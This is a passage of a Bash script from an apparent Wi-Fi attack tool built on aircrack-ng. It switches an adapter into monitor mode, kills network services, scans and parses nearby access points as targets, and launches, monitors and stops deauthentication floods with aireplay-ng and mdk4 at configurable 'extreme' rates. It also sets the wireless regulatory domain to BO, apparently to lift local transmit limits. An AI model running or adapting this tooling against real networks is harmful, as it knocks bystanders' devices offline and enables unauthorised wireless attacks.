            info "Deauth started on $bssid ch$channel — ${DEAUTH_CLIENT_COUNT} client(s), ${#DEAUTH_PIDS[@]} TX vector(s), ${DEAUTH_PPS} pps"
        fi
        return 0
    fi

    if [[ -f "$log" ]]; then
        warn "Deauth failed on $bssid — log: $(tail -3 "$log" 2>/dev/null | tr '\n' ' ')"
    else
        warn "Deauth processes failed to start on $bssid (check injection: aireplay-ng --test $MON_IFACE)"
    fi
    if [[ -n "${DAEMON_STATE_DIR:-}" ]]; then
        daemon_log "Deauth failed on $bssid ch$channel | clients=${DEAUTH_CLIENT_COUNT} | iface=$MON_IFACE"
    fi
    return 1
}

stop_airodump_scan() {
    local pid

    if [[ -n "${SCAN_PID:-}" ]] && kill -0 "$SCAN_PID" 2>/dev/null; then
        kill -SIGINT "$SCAN_PID" 2>/dev/null || true
        wait "$SCAN_PID" 2>/dev/null || true
    fi
    SCAN_PID=""
    while read -r pid; do
        [[ -n "$pid" ]] || continue
        kill -SIGINT "$pid" 2>/dev/null || true
    done < <(pgrep -x airodump-ng 2>/dev/null || true)
    sleep 0.4
}

stop_deauth_attack() {
    local pid

    for pid in "${DEAUTH_PIDS[@]}"; do
        [[ -n "$pid" ]] && kill -SIGINT "$pid" 2>/dev/null || true
    done
    sleep 0.1
    for pid in "${DEAUTH_PIDS[@]}"; do
        [[ -n "$pid" ]] && kill -SIGTERM "$pid" 2>/dev/null || true
        [[ -n "$pid" ]] && wait "$pid" 2>/dev/null || true
    done
    DEAUTH_PIDS=()
    DEAUTH_PID=""
    DEAUTH_CLIENTS=()
    DEAUTH_CLIENT_COUNT=0
    pkill -SIGINT -x aireplay-ng 2>/dev/null || true
    pkill -SIGTERM -x aireplay-ng 2>/dev/null || true
    pkill -SIGINT -x mdk4 2>/dev/null || true
    pkill -SIGTERM -x mdk4 2>/dev/null || true
    sleep 0.1
    pkill -9 -x aireplay-ng 2>/dev/null || true
    pkill -9 -x mdk4 2>/dev/null || true
}

on_error() {
    local line="$1"
    warn "Unexpected failure at line $line (exit code $?)."
    warn "Restoring adapter and cleaning up..."
}

safe_read() {
    local __var="$1"
    local __prompt="$2"
    local __value=""
    if ! IFS= read -r -p "$__prompt" __value; then
        echo ""
        die "Input cancelled (EOF). Exiting safely."
    fi
    printf -v "$__var" '%s' "$__value"
}

safe_write() {
    local file="$1"
    local content="$2"
    local tmp dir="${file%/*}"

    [[ -n "$dir" && "$dir" != "$file" ]] && mkdir -p "$dir" 2>/dev/null || true
    tmp="${file}.tmp.$$"
    if printf '%s' "$content" >"$tmp" 2>/dev/null; then
        mv -f "$tmp" "$file" 2>/dev/null || { rm -f "$tmp"; return 1; }
        return 0
    fi
    rm -f "$tmp"
    return 1
}

ensure_disk_space() {
    local target="${1:-${SESSION_DATA_DIR:-${TOOL_DIR:-.}}}"
    local avail_kb

    mkdir -p "$target" 2>/dev/null || true
    avail_kb=$(df -Pk "$target" 2>/dev/null | awk 'NR==2 {print $4}')
    avail_kb=${avail_kb:-0}
    if (( avail_kb < 51200 )); then
        warn "Low disk space — cleaning old scan captures..."
        find "${SESSION_DATA_DIR:-.}" -maxdepth 3 -name '*.cap' -delete 2>/dev/null || true
        avail_kb=$(df -Pk "$target" 2>/dev/null | awk 'NR==2 {print $4}')
        avail_kb=${avail_kb:-0}
        if (( avail_kb < 10240 )); then
            die "Not enough disk space (need at least 10MB free). Free space and retry."
        fi
    fi
}

resolve_tool_dir() {
    local script_abs

    [[ -n "${TOOL_DIR:-}" ]] && return 0
    script_abs=$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || echo "$0")
    TOOL_DIR=$(dirname "$script_abs")
    SESSION_DATA_DIR="${TOOL_DIR}/session_data"
}

create_session_dir() {
    local session_dir

    resolve_tool_dir
    session_dir="${SESSION_DATA_DIR}/active"
    mkdir -p "${session_dir}/cmd_queue" "${session_dir}/session" "${session_dir}/logs" 2>/dev/null || \
        die "Could not create session_data in ${TOOL_DIR}."
    ensure_disk_space "$SESSION_DATA_DIR"
    echo "$session_dir"
}

cleanup_session_data() {
    resolve_tool_dir
    [[ -n "${SESSION_DATA_DIR:-}" && -d "$SESSION_DATA_DIR" ]] || return 0
    rm -rf "$SESSION_DATA_DIR" 2>/dev/null || warn "Could not remove session data: $SESSION_DATA_DIR"
}

cleanup_scan_artifacts() {
    local outprefix="${1:-${DAEMON_STATE_DIR}/session/scan}"
    local dir="${outprefix%/*}"
    local keep_csv="${2:-}"

    [[ -d "$dir" ]] || return 0
    find "$dir" -maxdepth 1 -name '*.cap' -delete 2>/dev/null || true
    find "$dir" -maxdepth 1 -name '*.kismet.*' -delete 2>/dev/null || true
    if [[ -n "$keep_csv" && -f "$keep_csv" ]]; then
        find "$dir" -maxdepth 1 -name '*.csv' ! -name "$(basename "$keep_csv")" -delete 2>/dev/null || true
    fi
}

trim_daemon_log() {
    local log="${DAEMON_STATE_DIR}/daemon.log"
    local max_kb=512

    [[ -f "$log" ]] || return 0
    if (( $(wc -c <"$log" 2>/dev/null | tr -d ' ') > max_kb * 1024 )); then
        tail -c $((max_kb * 512)) "$log" >"${log}.trim" 2>/dev/null && mv -f "${log}.trim" "$log"
    fi
}

default_packets_for_network() {
    case "${ATTACK_SPEED,,}" in
        low) echo 128 ;;
        medium) echo 256 ;;
        turbo|ultra|hyper|extreme|high|*) echo 0 ;;
    esac
}

get_mon_tx_packets() {
    local iface="${MON_IFACE:-}"
    local path

    [[ -n "$iface" ]] || { echo 0; return; }
    path="/sys/class/net/${iface}/statistics/tx_packets"
    if [[ -f "$path" ]]; then
        cat "$path" 2>/dev/null || echo 0
    else
        echo 0
    fi
}

aireplay_log_path() {
    if [[ -n "${DAEMON_STATE_DIR:-}" ]]; then
        echo "${DAEMON_STATE_DIR}/session/aireplay.log"
    elif [[ -n "${TEMPDIR:-}" ]]; then
        echo "${TEMPDIR}/aireplay.log"
    else
        echo "/tmp/aireplay.log"
    fi
}

aireplay_log_shows_tx() {
    local log
    log=$(aireplay_log_path)
    [[ -f "$log" ]] || return 1
    grep -qiE 'Sending DeAuth|Directing packet|Got a deauth|Injection is working|AP found|DeAuth' "$log" 2>/dev/null
}

write_tx_status() {
    local idx="$1" essid="$2" tx_ok="$3" msg="$4"
    local tx_now sent target

    [[ -n "${DAEMON_STATE_DIR:-}" ]] || return 0
    tx_now=$(get_mon_tx_packets)
    sent=$(( tx_now - DEAUTH_TX_BASELINE ))
    (( sent < 0 )) && sent=0
    target="${DEAUTH_TARGET_PACKETS:-0}"
    essid="${essid//\"/\\\"}"
    msg="${msg//\"/\\\"}"
    safe_write "${DAEMON_STATE_DIR}/tx_status.json" \
        "{\"target_idx\":${idx},\"essid\":\"${essid}\",\"tx_ok\":${tx_ok},\"tx_packets\":${tx_now},\"packets_sent\":${sent},\"packets_target\":${target},\"deauth_clients\":${DEAUTH_CLIENT_COUNT:-0},\"deauth_mode\":\"${DEAUTH_MODE:-aireplay}\",\"message\":\"${msg}\"}" \
        || true
}

verify_packet_tx() {
    local pkt_target="${1:-$DEAUTH_TARGET_PACKETS}"
    local tx_now alive=0 log_ok=0 elapsed

    tx_now=$(get_mon_tx_packets)
    deauth_any_alive && alive=1
    aireplay_log_shows_tx && log_ok=1
    elapsed=$(( $(date +%s) - DEAUTH_START_TS ))

    if (( tx_now > DEAUTH_TX_LAST )) || (( log_ok )); then
        DEAUTH_TX_OK=1
        DEAUTH_FAIL_STREAK=0
    elif (( alive == 0 )) && (( pkt_target > 0 )) && (( tx_now > DEAUTH_TX_BASELINE + 2 )); then
        DEAUTH_TX_OK=1
        DEAUTH_FAIL_STREAK=0
    elif (( elapsed >= 3 )) && (( tx_now <= DEAUTH_TX_BASELINE )) && (( alive == 0 )) && (( ! log_ok )); then
        DEAUTH_TX_OK=0
        DEAUTH_FAIL_STREAK=$((DEAUTH_FAIL_STREAK + 1))
    elif (( elapsed >= 5 )) && (( tx_now <= DEAUTH_TX_LAST )) && (( ! log_ok )); then
        DEAUTH_TX_OK=0
        DEAUTH_FAIL_STREAK=$((DEAUTH_FAIL_STREAK + 1))
    fi

    DEAUTH_TX_LAST=$tx_now
    (( DEAUTH_TX_OK )) && return 0
    return 1
}

save_network_state() {
    NM_WAS_ACTIVE=0
    WPA_WAS_ACTIVE=0
    if command -v systemctl >/dev/null 2>&1; then
        systemctl is-active --quiet NetworkManager 2>/dev/null && NM_WAS_ACTIVE=1
        systemctl is-active --quiet wpa_supplicant 2>/dev/null && WPA_WAS_ACTIVE=1
    fi
}

restore_network_services() {
    if [[ "${NM_WAS_ACTIVE:-0}" -eq 1 ]] && command -v systemctl >/dev/null 2>&1; then
        if ! systemctl start NetworkManager &>/dev/null; then
            warn "Could not restart NetworkManager. Run: sudo systemctl start NetworkManager"
        else
            info "NetworkManager restarted."
        fi
    fi
    if [[ "${WPA_WAS_ACTIVE:-0}" -eq 1 ]] && command -v systemctl >/dev/null 2>&1; then
        systemctl start wpa_supplicant &>/dev/null || true
    fi
}

stop_background_jobs() {
    local pid

    stop_deauth_attack

    if [[ -n "${SCAN_PID:-}" ]] && kill -0 "$SCAN_PID" 2>/dev/null; then
        kill -SIGINT "$SCAN_PID" 2>/dev/null || true
        wait "$SCAN_PID" 2>/dev/null || true
    fi
    SCAN_PID=""

    while read -r pid; do
        [[ -n "$pid" ]] || continue
        kill -SIGTERM "$pid" 2>/dev/null || true
    done < <(jobs -p 2>/dev/null || true)

    sleep 0.3

    while read -r pid; do
        [[ -n "$pid" ]] || continue
        kill -0 "$pid" 2>/dev/null || continue
        kill -SIGKILL "$pid" 2>/dev/null || true
    done < <(jobs -p 2>/dev/null || true)
}

restore_managed_mode() {
    local base="${MON_IFACE:-$SELECTED_IFACE}"
    local mon="${MON_IFACE:-}"

    [[ "${MONITOR_ENABLED:-0}" -eq 1 ]] || return 0

    stop_background_jobs
    base=$(get_base_iface "$base")

    if [[ -n "$mon" ]]; then
        info "Stopping monitor mode on $mon..."
        airmon-ng stop "$mon" &>/dev/null || true
    elif is_monitor_iface "$base"; then
        airmon-ng stop "$base" &>/dev/null || true
    fi

    if iface_exists "$base"; then
        iw dev "$base" set type managed &>/dev/null || true
        ip link set "$base" down &>/dev/null || true
        ip link set "$base" up &>/dev/null || true

        if is_monitor_iface "$base"; then
            warn "$base may still be in monitor mode. Try: sudo airmon-ng stop $base"
        else
            info "Adapter $base restored to managed mode."
        fi
    fi

    MONITOR_ENABLED=0
}

is_valid_mac() {
    [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

normalize_channel() {
    local ch="${1//[[:space:]]/}"
    ch="${ch%%[^0-9]*}"
    echo "$ch"
}

is_valid_channel() {
    local ch
    ch=$(normalize_channel "$1")
    [[ "$ch" =~ ^[0-9]+$ ]] && (( ch >= 1 && ch <= 233 ))
}

# Extract AP rows from airodump-ng CSV (stops before Station MAC section).
read_ap_csv_rows() {
    local csv="$1"
    awk '
        /^BSSID,/ { ap = 1; next }
        /^Station MAC,/ { exit }
        ap && NF > 0 { print }
    ' "$csv"
}

is_monitor_iface() {
    local iface="$1"
    local attempt iface_type

    [[ -n "$iface" ]] || return 1

    for attempt in 1 2 3 4 5 6; do
        if iw dev "$iface" info 2>/dev/null | grep -qiE 'type[[:space:]]+monitor'; then
            return 0
        fi
        if iwconfig "$iface" 2>/dev/null | grep -qiE 'Mode:Monitor|mode:monitor'; then
            return 0
        fi
        # 802 = IEEE80211_RADIOTAP (monitor). 803 = generic 802.11 (managed too) — do NOT use 803.
        if [[ -r "/sys/class/net/$iface/type" ]]; then
            iface_type=$(<"/sys/class/net/$iface/type")
            [[ "$iface_type" == "802" ]] && return 0
        fi
        sleep 0.4
    done
    return 1
}

try_iw_monitor_mode() {
    local iface="$1"

    ip link set "$iface" down &>/dev/null || true
    if iw dev "$iface" set type monitor &>/dev/null; then
        ip link set "$iface" up &>/dev/null || true
        sleep 0.6
        if is_monitor_iface "$iface"; then
            echo "$iface"
            return 0
        fi
    fi

    iw dev "$iface" set type managed &>/dev/null || true
    ip link set "$iface" up &>/dev/null || true
    return 1
}

iface_exists() {
    ip link show "$1" &>/dev/null 2>&1
}

get_base_iface() {
    local iface="$1"
    if [[ "$iface" == *mon ]]; then
        echo "${iface%mon}"
    else
        echo "$iface"
    fi
}

get_adapter_label() {
    local iface="$1"
    local mode phy driver line

    mode=$(iw dev "$iface" info 2>/dev/null | awk '/type/{print $2}' || echo "unknown")
    phy=$(iw dev "$iface" info 2>/dev/null | awk '/wiphy/{print $2}' || echo "")

    if [[ "${WIFI_DASHBOARD_MODE:-0}" -eq 1 ]]; then
        driver=$(readlink -f "/sys/class/net/${iface}/device/driver" 2>/dev/null | xargs basename 2>/dev/null || echo "")
        if [[ -n "$driver" ]]; then
            echo "[$mode] phy${phy} ($driver)"
        else
            echo "[$mode] phy${phy}"
        fi
        return 0
    fi

    line=$(timeout 3 airmon-ng 2>/dev/null | awk -v i="$iface" '$2 == i { $1=""; $2=""; print substr($0,3); exit }' || true)
    if [[ -n "$line" ]]; then
        driver=$(echo "$line" | awk '{print $1}')
        echo "[$mode] $(echo "$line" | cut -d' ' -f2-) ($driver)"
    else
        echo "[$mode]"
    fi
}

ensure_wifi_drivers() {
    local need_firmware=0 quiet="${1:-0}"

    if lsusb 2>/dev/null | grep -qE '148f:2070|148f:3070|148f:5370|148f:7572'; then
        [[ "$quiet" -eq 0 ]] && info "Ralink/Mediatek USB adapter detected."
        if ! lsmod | grep -q '^rt2800usb'; then
            [[ "$quiet" -eq 0 ]] && info "Loading rt2800usb kernel driver..."
            modprobe rt2800usb 2>/dev/null || [[ "$quiet" -eq 1 ]] || warn "Could not load rt2800usb."
        fi

        if [[ ! -f /lib/firmware/rt2870.bin ]]; then
            [[ "$quiet" -eq 1 ]] || warn "Ralink firmware missing: /lib/firmware/rt2870.bin"
            need_firmware=1
        fi
    fi

    if (( need_firmware && quiet == 0 )); then
        warn "Install firmware with:"
        echo "  sudo apt update && sudo apt install -y firmware-linux-nonfree"
    fi
}

detect_mon_iface() {
    local output="$1" iface="$2"
    local mon=""

    # "(mac80211 monitor mode vif enabled for [phy11]wlan1 on [phy11]wlan1mon)"
    mon=$(echo "$output" | grep -oE "for \[[^]]+\]${iface} on \[[^]]+\][^ \"']+" 2>/dev/null | sed 's/.*\]//' | head -1 || true)
    if [[ -n "$mon" ]] && iface_exists "$mon"; then
        echo "$mon"
        return 0
    fi

    # "monitor mode enabled on wlan0mon"
    mon=$(echo "$output" | grep -oE 'monitor mode (vif )?enabled on [^ ]+' 2>/dev/null | awk '{print $NF}' || true)
    if [[ -n "$mon" ]] && iface_exists "$mon"; then
        echo "$mon"
        return 0
    fi

    # Standard naming: wlan1 -> wlan1mon
    if iface_exists "${iface}mon"; then
        echo "${iface}mon"
        return 0
    fi

    # Newly created mon0 / wlan0mon style interfaces for this phy
    mon=$(iw dev 2>/dev/null | awk -v base="$iface" '
        /Interface/{name=$2}
        /type monitor/ && (name == base "mon" || name ~ "^mon" || name ~ "^" base "mon") { print name; exit }
    ' || true)
    if [[ -n "$mon" ]]; then
        echo "$mon"
        return 0
    fi

    mon=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E "^(mon|${iface}mon)$" 2>/dev/null | head -1 || true)
    if [[ -n "$mon" ]]; then
        echo "$mon"
        return 0
    fi

    if is_monitor_iface "$iface"; then
        echo "$iface"
        return 0
    fi

    return 1
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "Root privileges required. Re-running with sudo..."
        exec sudo -E "$0" "$@"
    fi
}

check_tools() {
    for tool in airmon-ng airodump-ng aireplay-ng iwconfig iw ip; do
        command -v "$tool" >/dev/null 2>&1 || die "Required tool '$tool' not found. Please install aircrack-ng and wireless tools."
    done
}

# ------------------------------------------------------------
# 1. Detect and select wireless interface
# ------------------------------------------------------------
find_wireless_ifaces() {
    local -a ifaces=()
    local choice i

    ensure_wifi_drivers

    while read -r iface; do
        if iface_exists "$iface"; then
            ifaces+=("$iface")
        fi
    done < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')

    if [[ ${#ifaces[@]} -eq 0 ]]; then
        die "No wireless interfaces found. Plug in adapter and run: iw dev"
    fi

    echo "Detected wireless interfaces:"
    for i in "${!ifaces[@]}"; do
        echo "  $((i + 1))) ${ifaces[$i]}  $(get_adapter_label "${ifaces[$i]}")"
    done

    while true; do
        safe_read choice "Choose interface (1-${#ifaces[@]}): "
        if [[ $choice =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#ifaces[@]} )); then
            SELECTED_IFACE="${ifaces[$((choice - 1))]}"
            break
        fi
        echo "Invalid selection. Enter a number between 1 and ${#ifaces[@]}."
    done

    echo "Selected interface: $SELECTED_IFACE"
}

# ------------------------------------------------------------
# 2. Enable monitor mode
# ------------------------------------------------------------
enable_monitor_mode() {
    local iface="$1"
    local base_iface output rc mon

    echo "Preparing adapter $iface..."

    if is_monitor_iface "$iface"; then
        ip link set "$iface" up &>/dev/null || true
        MON_IFACE="$iface"
        MONITOR_ENABLED=1
        echo "Already in monitor mode: $MON_IFACE"
        return 0
    fi

    base_iface=$(get_base_iface "$iface")

    if iface_exists "${base_iface}mon" && is_monitor_iface "${base_iface}mon"; then
        ip link set "${base_iface}mon" up &>/dev/null || true
        MON_IFACE="${base_iface}mon"
        MONITOR_ENABLED=1
        echo "Using existing monitor interface: $MON_IFACE"
        return 0
    fi

    iface="$base_iface"
    save_network_state

    info "Stopping processes that may block monitor mode..."
    airmon-ng check kill >/dev/null 2>&1 || true

    echo "Enabling monitor mode on $iface..."
    ip link set "$iface" up &>/dev/null || true

    if lsusb -d 148f:2070 &>/dev/null || lsusb -d 148f:3070 &>/dev/null; then
        modprobe rt2800usb &>/dev/null || true
        sleep 0.5
    fi

    set +e
    output=$(airmon-ng start "$iface" 2>&1)
    rc=$?
    set -e
    if (( rc != 0 )); then
        die "airmon-ng start failed on $iface (exit $rc).

$output"
    fi
    echo "$output"

    set +e
    mon=$(detect_mon_iface "$output" "$iface")
    rc=$?
    set -e
    if (( rc != 0 )) || [[ -z "$mon" ]]; then
        die "Could not identify monitor interface for $iface.

$output"
    fi

    ip link set "$mon" up &>/dev/null || true
    sleep 0.8

    if ! is_monitor_iface "$mon"; then
        airmon-ng stop "$mon" &>/dev/null || true
        die "Monitor mode verification failed for $iface ($mon)."
    fi

    MON_IFACE="$mon"
    MONITOR_ENABLED=1
    echo "Monitor interface ready: $MON_IFACE"
}

# ------------------------------------------------------------
# 3. Ask for scan duration (validate integer)
# ------------------------------------------------------------
ask_duration() {
    local dur
    while true; do
        safe_read dur "Sonar scan duration in seconds? (recommended: 30-60 for all networks): "
        if [[ $dur =~ ^[0-9]+$ ]] && (( dur >= 15 )); then
            SCAN_DURATION=$dur
            break
        fi
        echo "Please enter at least 15 seconds (30-60 recommended for more networks)."
    done
}

find_scan_csv() {
    local outprefix="$1"
    local f

    for f in "${outprefix}"-*.csv "${outprefix}"*.csv; do
        [[ -f "$f" ]] || continue
        echo "$f"
        return 0
    done
    f=$(find "$(dirname "$outprefix")" -maxdepth 1 -name '*.csv' -print 2>/dev/null | head -1)
    [[ -n "$f" && -f "$f" ]] && echo "$f"
}

start_airodump_scan() {
    local mon="$1"
    local outprefix="$2"
    local errlog="${TEMPDIR}/airodump.err"
    local -a extra=()

    read -ra extra <<< "$(airodump_extra_args)"

    : >"$errlog"
    pkill -x airodump-ng 2>/dev/null || true
    sleep 0.5

    if ! iw dev "$mon" info &>/dev/null; then
        if [[ "${WIFI_DASHBOARD_MODE:-0}" -eq 1 ]]; then
            daemon_log "Scan failed: interface $mon not found"
            return 1
        fi
        die "Interface $mon not found."
    fi

    set +e
    if [[ "${WIFI_DASHBOARD_MODE:-0}" -eq 1 ]]; then
        airodump-ng "$mon" --ignore-negative-one "${extra[@]}" -f 200 \
            -w "$outprefix" --output-format csv --write-interval 1 &>/dev/null &
    else
        airodump-ng "$mon" --ignore-negative-one "${extra[@]}" -f 200 \
            -w "$outprefix" --output-format csv --write-interval 1 &>"$errlog" &
    fi
    SCAN_PID=$!
    sleep 1

    if ! kill -0 "$SCAN_PID" 2>/dev/null; then
        warn "Retrying airodump-ng with basic options..."
        if [[ "${WIFI_DASHBOARD_MODE:-0}" -eq 1 ]]; then
            airodump-ng "$mon" -w "$outprefix" --output-format csv &>/dev/null &
        else
            airodump-ng "$mon" -w "$outprefix" --output-format csv &>>"$errlog" &
        fi
        SCAN_PID=$!
        sleep 1
    fi

    if ! kill -0 "$SCAN_PID" 2>/dev/null; then
        if [[ "${WIFI_DASHBOARD_MODE:-0}" -eq 1 ]]; then
            daemon_log "airodump-ng failed on $mon: $(tr '\n' ' ' <"$errlog" 2>/dev/null)"
            SCAN_PID=""
            return 1
        fi
        die "airodump-ng failed to start on $mon.

$(cat "$errlog" 2>/dev/null)

Hints:
  - Run: iw dev $mon info  (must show type monitor)
  - Run: sudo airmon-ng check kill
  - Try: sudo airmon-ng start $mon"
    fi
    set -e

    info "airodump-ng running (PID $SCAN_PID)"
    return 0
}

ensure_airodump_running() {
    local mon="$1"
    local outprefix="$2"

    if [[ -n "${SCAN_PID:-}" ]] && kill -0 "$SCAN_PID" 2>/dev/null; then
        return 0
    fi
    warn "airodump-ng stopped — restarting..."
    start_airodump_scan "$mon" "$outprefix"
}

# ------------------------------------------------------------
# 4. Scan with airodump-ng
# ------------------------------------------------------------
run_scan() {
    local mon="$1"
    local dur="$2"
    local outprefix scan_csv

    TEMPDIR=$(mktemp -d) || die "Could not create temporary directory for scan results."
    outprefix="${TEMPDIR}/scan"
    radar_init_state

    echo "Starting sonar scan on $mon..."
    iw reg set BO &>/dev/null || true
    ip link set "$mon" up &>/dev/null || true

    start_airodump_scan "$mon" "$outprefix"

    echo ""
    info "Initializing submarine sonar scan on $mon..."
    sleep 0.5
    set +e
    run_radar_scan_animation "$dur" "$outprefix" "$mon"
    set -e

    kill -SIGINT "$SCAN_PID" 2>/dev/null || true
    wait "$SCAN_PID" 2>/dev/null || true
    sleep 2
    SCAN_PID=""
    echo "Scan finished."

    scan_csv=$(find_scan_csv "$outprefix")
    if [[ -z "$scan_csv" || ! -f "$scan_csv" ]]; then
        die "No scan output file found.

Hints:
  - Scan at least 30-60 seconds
  - Check: iw dev $mon info
  - Test: sudo airodump-ng $mon"
    fi
    SCAN_CSV="$scan_csv"
    info "Scan file: $SCAN_CSV"
}

# ------------------------------------------------------------
# 5. Parse and display networks
# ------------------------------------------------------------
parse_networks() {
    local csv="$1"
    declare -g -a NET_BSSID NET_CHANNEL NET_ENC NET_ESSID NET_POWER NET_PACKETS
    declare -A SEEN_BSSID=()
    NET_COUNT=0

    echo "Parsing scan results..."

    local line bssid channel privacy power essid default_pkts
    local -a fields
    local j

    default_pkts=$(default_packets_for_network)

    while IFS= read -r line; do
        [[ -z "${line//[[:space:]]/}" ]] && continue

        fields=()
        IFS=',' read -ra fields <<< "$line"

        bssid="${fields[0]//[[:space:]\"]/}"
        is_valid_mac "$bssid" || continue

        channel=$(normalize_channel "${fields[3]}")
        is_valid_channel "$channel" || continue

        [[ -n "${SEEN_BSSID[$bssid]:-}" ]] && continue
        SEEN_BSSID[$bssid]=1

        privacy="${fields[5]//[[:space:]]/}"
        power="${fields[8]//[[:space:]]/}"

        essid=""
        for ((j = 13; j < ${#fields[@]} - 1; j++)); do
            [[ -n "$essid" ]] && essid+=","
            essid+="${fields[j]}"
        done
        essid="${essid//[[:space:]\"]/}"
        [[ -z "$essid" ]] && essid="<hidden>"

        ((++NET_COUNT))
        NET_BSSID[$NET_COUNT]="$bssid"
        NET_CHANNEL[$NET_COUNT]="$channel"
        NET_ENC[$NET_COUNT]="$privacy"
        NET_ESSID[$NET_COUNT]="$essid"
        NET_POWER[$NET_COUNT]="$power"
        NET_PACKETS[$NET_COUNT]="${NET_PACKETS[$NET_COUNT]:-$default_pkts}"
        NET_LAST_SEEN[$bssid]=$(date +%s)
        NET_ONLINE[$bssid]=1
    done < <(read_ap_csv_rows "$csv")

    if [[ $NET_COUNT -eq 0 ]]; then
        if [[ "${WIFI_DASHBOARD_MODE:-0}" -eq 1 ]]; then
            return 1
        fi
        die "No valid networks found in scan results.

Hints:
  - Run scan for at least 20-30 seconds
  - Ensure the adapter antenna has good signal
  - Verify monitor mode: iw dev $MON_IFACE info"
    fi

    if [[ "${WIFI_DASHBOARD_MODE:-0}" -eq 1 ]]; then
        return 0
    fi

    info "Found $NET_COUNT unique network(s)."

    printf "%-4s %-20s %-8s %-15s %-8s %s\n" "No." "BSSID" "Channel" "Encryption" "Power" "ESSID"
    printf "%-4s %-20s %-8s %-15s %-8s %s\n" "---" "--------------------" "--------" "---------------" "--------" "-----"
    for i in $(seq 1 "$NET_COUNT"); do
        printf "%-4d %-20s %-8s %-15s %-8s %s\n" "$i" "${NET_BSSID[$i]}" "${NET_CHANNEL[$i]}" "${NET_ENC[$i]}" "${NET_POWER[$i]}" "${NET_ESSID[$i]}"
    done
}

# Merge live airodump CSV — add new APs, update power, drop stale/offline.
merge_networks_from_csv() {
    local csv="$1"
    local now stale default_pkts prev_count added=0 removed=0
    local -A CUR_CH=() CUR_ENC=() CUR_PWR=() CUR_ESSID=() CUR_SEEN=()
    local -A OLD_PKT=() OLD_ORDER=()
    local line bssid channel privacy power essid
    local -a fields order=()
    local -a new_bssid=() new_ch=() new_enc=() new_essid=() new_pwr=() new_pkt=()
    local i j key old_bssid

    [[ -f "$csv" ]] || return 1

    now=$(date +%s)
    stale="${DAEMON_LIVE_STALE:-30}"
    default_pkts=$(default_packets_for_network)
    prev_count="${NET_COUNT:-0}"

    for i in $(seq 1 "$prev_count"); do
        bssid="${NET_BSSID[$i]}"
        [[ -z "$bssid" ]] && continue
        OLD_PKT[$bssid]="${NET_PACKETS[$i]:-$default_pkts}"
        OLD_ORDER[$bssid]=$i
        [[ -n "${NET_LAST_SEEN[$bssid]:-}" ]] || NET_LAST_SEEN[$bssid]=$now
    done

    while IFS= read -r line; do
        [[ -z "${line//[[:space:]]/}" ]] && continue
        fields=()
        IFS=',' read -ra fields <<< "$line"
        bssid="${fields[0]//[[:space:]\"]/}"
        is_valid_mac "$bssid" || continue
        channel=$(normalize_channel "${fields[3]}")
        is_valid_channel "$channel" || continue

        privacy="${fields[5]//[[:space:]]/}"
        power="${fields[8]//[[:space:]]/}"
        power=$(normalize_power "$power")
        essid=""
        for ((j = 13; j < ${#fields[@]} - 1; j++)); do
            [[ -n "$essid" ]] && essid+=","
            essid+="${fields[j]}"
        done
        essid="${essid//[[:space:]\"]/}"
        [[ -z "$essid" ]] && essid="<hidden>"

        CUR_SEEN[$bssid]=1
        NET_LAST_SEEN[$bssid]=$now
        NET_ONLINE[$bssid]=1
        CUR_CH[$bssid]="$channel"
        CUR_ENC[$bssid]="$privacy"
        CUR_PWR[$bssid]="$power"
        CUR_ESSID[$bssid]="$essid"
    done < <(read_ap_csv_rows "$csv")

    if [[ "${2:-}" == "strict" ]]; then
        local -A INCLUDED=()
        local -a sorted=()
        local thresh old_idx old_pwr online_flag

        for bssid in "${!CUR_SEEN[@]}"; do
            NET_MISS[$bssid]=0
            INCLUDED[$bssid]=1
            NET_ONLINE[$bssid]=1
        done

        for bssid in "${!OLD_ORDER[@]}"; do
            [[ -n "${INCLUDED[$bssid]:-}" ]] && continue
            old_idx=${OLD_ORDER[$bssid]}
            old_pwr=$(normalize_power "${NET_POWER[$old_idx]}")
            thresh=$(get_miss_threshold_for_bssid "$old_pwr")
            NET_MISS[$bssid]=$((${NET_MISS[$bssid]:-0} + 1))
            if (( NET_MISS[$bssid] < thresh )); then
                INCLUDED[$bssid]=1
                CUR_CH[$bssid]="${NET_CHANNEL[$old_idx]}"
                CUR_ENC[$bssid]="${NET_ENC[$old_idx]}"
                CUR_ESSID[$bssid]="${NET_ESSID[$old_idx]}"
                CUR_PWR[$bssid]="${NET_POWER[$old_idx]}"
                NET_ONLINE[$bssid]=0
            else
                removed=$((removed + 1))
                unset "NET_LAST_SEEN[$bssid]" "NET_ONLINE[$bssid]" "NET_MISS[$bssid]"
            fi
        done

        mapfile -t sorted < <(printf '%s\n' "${!INCLUDED[@]}" | LC_ALL=C sort)

        new_bssid=()
        new_ch=()
        new_enc=()
        new_essid=()
        new_pwr=()
        new_pkt=()

        for bssid in "${sorted[@]}"; do
            [[ -z "$bssid" || -z "${INCLUDED[$bssid]:-}" ]] && continue
            new_bssid+=("$bssid")
            new_ch+=("${CUR_CH[$bssid]}")
            new_enc+=("${CUR_ENC[$bssid]}")
            new_essid+=("${CUR_ESSID[$bssid]}")
            new_pwr+=("$(normalize_power "${CUR_PWR[$bssid]}")")
            new_pkt+=("${OLD_PKT[$bssid]:-$default_pkts}")
            [[ -n "${OLD_ORDER[$bssid]:-}" ]] || added=$((added + 1))
        done

        NET_COUNT=${#new_bssid[@]}
        NET_BSSID=()
        NET_CHANNEL=()
        NET_ENC=()
        NET_ESSID=()
        NET_POWER=()
        NET_PACKETS=()
        for i in $(seq 1 "$NET_COUNT"); do
            j=$((i - 1))
            NET_BSSID[$i]="${new_bssid[$j]}"
            NET_CHANNEL[$i]="${new_ch[$j]}"
            NET_ENC[$i]="${new_enc[$j]}"
            NET_ESSID[$i]="${new_essid[$j]}"
            NET_POWER[$i]="${new_pwr[$j]}"
            NET_PACKETS[$i]="${new_pkt[$j]}"
            bssid="${NET_BSSID[$i]}"
            online_flag="${NET_ONLINE[$bssid]:-1}"
            NET_ONLINE[$bssid]=$online_flag
            NET_LAST_SEEN[$bssid]=$now
        done

        if (( added > 0 || removed > 0 || NET_COUNT != prev_count )); then
            DAEMON_NET_REV=$((DAEMON_NET_REV + 1))
